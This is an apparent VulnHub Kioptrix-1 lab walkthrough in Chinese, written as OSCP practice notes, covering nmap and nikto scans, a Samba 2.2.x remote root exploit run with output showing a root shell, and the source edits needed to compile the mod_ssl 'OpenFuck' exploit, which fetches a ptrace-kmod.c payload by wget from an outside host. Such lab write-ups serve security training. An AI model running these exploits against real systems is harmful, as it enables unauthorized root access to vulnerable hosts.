# Kioptrix-1

## 0x0 Preview

首先参考一下[这篇文章](https://github.com/isecurityplus/OSCP/blob/master/VulnHub/GetIP.md)获取靶机 IP 地址：

确认靶机 IP 地址为：`192.168.31.113`

## 0x1 信息收集

 首先使用 nmap 对目标进行信息收集：

```bash
sudo nmap -sV -sS -sC -p1-65535 --open -v 192.168.31.113
```

扫描结果如下：

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp  open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp open  rpcbind     2 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd (workgroup: bMYGROUP)
443/tcp open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2020-08-02T10:43:54+00:00; +1m50s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5

Host script results:
|_clock-skew: 1m49s
| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KIOPTRIX<00>         Flags: <unique><active>
|   KIOPTRIX<03>         Flags: <unique><active>
|   KIOPTRIX<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   MYGROUP<00>          Flags: <group><active>
|   MYGROUP<1d>          Flags: <unique><active>
|_  MYGROUP<1e>          Flags: <group><active>
|_smb2-time: Protocol negotiation failed (SMB2)
```

使用 nikto 对 80 HTTP 服务进行扫描：

```bash
nikto -host 192.168.31.113
```

扫描结果：

```bash
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
**+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.**
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).
+ OSVDB-3268: /manual/: Directory indexing found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ 8728 requests: 0 error(s) and 20 item(s) reported on remote host
+ End Time:           2020-08-02 07:49:58 (GMT-4) (129 seconds)                                           
---------------------------------------------------------------------------                               
+ 1 host(s) tested
```

收集到的信息：

-  根据 nikto 结果，靶机使用 mod_ssl version 2.8 可能存在 remote buffer overflow 
-  靶机使用 samba 服务

## 0x3 突破点一：Samba 服务

使用 msf 的`auxiliary/scanner/smb/smb_version` :

![image.png](https://i.loli.net/2020/08/07/UQc2DkCy8J7Y5ql.png)

可以看到目标服务器使用 `Samba 2.2.1a`

searchsploit 搜索发现该版本存在 RCE 漏洞： 

![image.png](https://i.loli.net/2020/08/07/dwgr6DfZkbuHMhy.png)

编译：

```
gcc 10.c -o sambal
```

编译完成后发起攻击：`./sambal -b 0 -v 10.11.31.113`

```
kali@kali:~$ ./sambal -b 0 -v 192.168.31.113
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Verbose mode.
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Using ret: [0xbffffed4]
+ Using ret: [0xbffffda8]
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
whoami
root
```

## 0x4 突破点二： Apache mode_ssl

不过在编译之前，我们需要先对`764.c` 做一些修改才能编译成功：

> *或者你可以直接在这里下载我修改后的：[https://github.com/isecurityplus/OSCP/blob/master/web-exploit-exp/Apache/764.c(CVE-2002-0082)](https://github.com/isecurityplus/OSCP/blob/master/web-exploit-exp/Apache/764.c(CVE-2002-0082))*

### 第一步：在开头添加模块：

```bash
#include <openssl/rc4.h>
#include <openssl/md5.h>
#define SSL2_MT_ERROR 0
#define SSL2_MT_CLIENT_FINISHED 3
#define SSL2_MT_SERVER_HELLO 4
#define SSL2_MT_SERVER_VERIFY 5
#define SSL2_MT_SERVER_FINISHED 6
#define SSL2_MAX_CONNECTION_ID_LENGTH 16
```
![image.png](https://i.loli.net/2020/08/07/UQc2DkCy8J7Y5ql.png)


### 第二步：替换 wget 后的 URL：

将如下行：

```bash
http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c
```

修改为：

```bash
https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
```

![image.png](https://i.loli.net/2020/08/07/dwgr6DfZkbuHMhy.png)

### 第三步：修改如下行内容：

将如下行：

```bash
*unsigned char *p, *end;*
```

修改为：

```bash
*const unsigned char *p, *end;*
```

> 大概在 970 行左右，在 vim 中可以使用`970gg` 快速跳转到 920 行

![](https://i.loli.net/2020/08/07/oDGsRqrwuQFOY7z.png)

### 第四步：修改如下行内容：

```bash
将：
if (pkey->type != EVP_PKEY_RSA) {
修改为：
if (EVP_PKEY_get1_RSA(pkey) == NULL) {
——————
将：
encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], pkey->pkey.rsa, RSA_PKCS1_PADDING);
修改为：
encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);
```

修改完成后：

![image.png](https://i.loli.net/2020/08/07/oDGsRqrwuQFOY7z.png)

### 第五步：安装 “libssl-dev”

```bash
sudo apt-get install libssl-dev
```

### 第六步：编译

```bash
gcc 764.c -o 764 -lcrypto
```

![image.png](https://i.loli.net/2020/08/07/OsJjGPe6wL7hM2X.png)

自此，就编译完成了，使用如下命令发起攻击：

```bash
./764 0x6b 443 192.168.31.113 -c 40
```

> 看其他人都可以成功 getshell，不过我试了好多次都无法成功，也不知是不是 macOS Vmware Fusion 的原因。
